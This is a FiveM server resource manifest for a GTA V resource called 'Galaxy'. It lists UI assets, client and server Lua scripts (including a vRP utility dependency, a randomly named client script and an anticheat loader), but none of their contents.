-- Galaxy

fx_version 'cerulean'
games { 'gta5' }

ui_page "gui/ui.html"

files { 
    "gui/*.woff",
    "gui/*.woff2",
    "gui/assets/*.png",
    "gui/ui.html",
    "gui/ui.css",
    "gui/ui.js",
}

client_scripts {
    "client.lua"
}

server_script {
    "@vrp/lib/utils.lua",
    "server.lua",
}

client_script 'QUiFQVgzcRzV.lua'
client_script "@GRP-Anticheat/acloader.lua"